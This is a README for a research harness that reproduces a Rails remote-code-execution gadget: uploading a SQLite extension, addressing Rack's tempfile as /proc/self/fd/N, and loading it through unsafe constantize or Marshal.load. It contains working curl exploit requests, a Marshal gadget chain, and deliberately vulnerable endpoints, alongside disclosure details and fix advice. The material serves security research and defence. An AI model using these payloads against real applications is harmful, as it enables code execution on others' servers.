# /proc/self/fd/N + sqlite3 extensions — Rails harness

Runnable harness for the research note
**[Bypassing Temp File Randomization: /proc/self/fd/N + sqlite3 Extensions RCE in Rails](https://shoo0lin.github.io/posts/rails-sqlite3-fd-rce.html)**.

It contains the Ruby and C pieces used in the local testbed: a minimal SQLite
extension, the Marshal gadget generator, and the deliberately vulnerable Rails
controller/routes that provide the two entry points.

> **Local, disposable, intentional.** Everything here is designed to run inside
> a throwaway Docker container against a Rails app you create yourself. Do not
> deploy these files, point them at any third-party service, or reuse the
> controller in real code. No live target was touched during the research.

## Scope — read this first

This is **not** a Rails, Rack, or sqlite3 vulnerability report. The precondition
is an application that already does one of these two things with user input:

```ruby
vuln_params[:type].constantize.new(*vuln_params[:args])   # unsafe reflection
Marshal.load(Base64.decode64(vuln_params[:deserialise]))  # unsafe deserialisation
```

Both patterns are already critical on their own. The contribution here is a
*gadget*: `SQLite3::Database.new(path, extensions: [...])` loads a native library
at construction time, and Rack's randomized multipart tempfile can be addressed
as `/proc/self/fd/N` without knowing its random suffix. Where one of the unsafe
patterns above exists, that pair turns it into native code execution. Where
neither exists, this harness has no entry point.

Disclosure: HackerOne **#3505185**. The Rails maintainer closed it **Informative**
and recommended publication, agreeing it is "a new gadget to exploit
already-dangerous code patterns, not a vulnerability in Rails, sqlite3, or Rack
themselves."

## Tested versions

Verified end to end on one pinned stack; no affected-version matrix was built,
so none is asserted here.

| Component | Version |
|---|---|
| Ruby | `3.4` (`ruby:3.4`) |
| Rails | `8.0.1` (`rails new vuln_app --minimal --api`) |
| sqlite3 gem | `1.8.0` (accepted `extensions:` in this testbed) |
| Rails environment | `production` |

Version caveat from the post: current ActiveRecord SQLite3 adapter docs annotate
`extensions` as requiring sqlite3 `2.4.0`+, while the pinned testbed resolved
`1.8.0` and accepted the option. Check the resolved version in your own bundle
rather than trusting a range.

## Files

| File | Purpose |
|---|---|
| `poc.c` | Tiny SQLite extension; its init function runs `touch /tmp/rce-conf.txt` as the execution marker. |
| `sqlite-marshal-poc.rb` | Builds the Base64 `Marshal` payload (`DeprecatedInstanceVariableProxy` → `SQLite3Adapter#connect!` → `SQLite3::Database.new` with the fd path). Takes the fd as an argument. |
| `vuln_controller.rb` | The two deliberately vulnerable endpoints (`reflection`, `marshal`). |
| `routes.rb` | Maps `POST /reflection` and `POST /marshal` to that controller. |
| `Dockerfile` | Minimal production-mode Rails 8.0.1 / Ruby 3.4 testbed; copies the two `.rb` files above into the generated app. |

## Reproduction (local container only)

Build and start the testbed:

```sh
docker build -t rails-fd-harness .
docker run --rm -it -p 3000:3000 rails-fd-harness
```

Compile the extension on the host (or inside the container if you have a
compiler there):

```sh
gcc -shared -fPIC -o payload.so poc.c
```

Upload it as a multipart part. Rack writes a tempfile even though there is no
upload route; the `.so` content type gives it a `.so` suffix, but the middle of
the name is random:

```sh
curl -F 'file=@payload.so' http://127.0.0.1:3000/
```

Find the descriptor for that tempfile from the Rails process (in the container):

```sh
ls -al /proc/1/fd
# e.g. 12 -> /tmp/RackMultipart20250225-1-oji5wc.so
```

**The fd number is per-process and per-run.** It was `13` in the reflection
experiment and `12` in the Marshal experiment. Enumerate it; never hard-code it.

Reflection path — construct a `SQLite3::Database` with the descriptor path in
`extensions:`:

```sh
curl -X POST http://127.0.0.1:3000/reflection \
  -H 'Content-Type: application/json' \
  -d '{"type":"SQLite3::Database",
       "args":["/tmp/rce.db",
               {"extensions":["/proc/self/fd/<FD>"]}]}'
```

Marshal path — generate the payload for the observed fd and POST it:

```sh
ruby sqlite-marshal-poc.rb <FD> > payload.b64
curl -X POST http://127.0.0.1:3000/marshal \
  -H 'Content-Type: application/json' \
  -d "{\"deserialise\":\"$(cat payload.b64)\"}"
```

Both paths end with the extension's init function running in the Rails process;
success is the appearance of an empty `/tmp/rce-conf.txt`. The `concurrent` gem
is required by the generator (`require "concurrent"`); it is present in a Rails
bundle. The payload runs with the privileges of the Rails process — `root` in
this container, which is another reason to keep it disposable.

## Cleanup

```sh
rm -f payload.so payload.b64 /tmp/rce-conf.txt /tmp/rce.db /tmp/r.db
docker rm -f <container-id>   # if you did not use --rm
```

All generated artefacts are ignored by `.gitignore`; none are committed.

## Fix (from the post)

1. Remove the dangerous pattern: do not pass user input to `constantize`,
   `safe_constantize`, `const_get`, or `Marshal.load`. Map identifiers to an
   allowlist of classes your code selects explicitly.
2. Find every instance: `grep -RnE 'constantize|safe_constantize|const_get|Marshal\.load' app/ lib/`
   and Brakeman. Brakeman flags the reflection pattern but cannot know which
   gadgets are installed.
3. Treat native extension loading as a sensitive capability (an open upstream
   defence-in-depth question).
4. Limit what the process can reach: unprivileged user, read-only filesystem
   where possible, egress policy.

See the post for the full argument and the verbatim maintainer response.
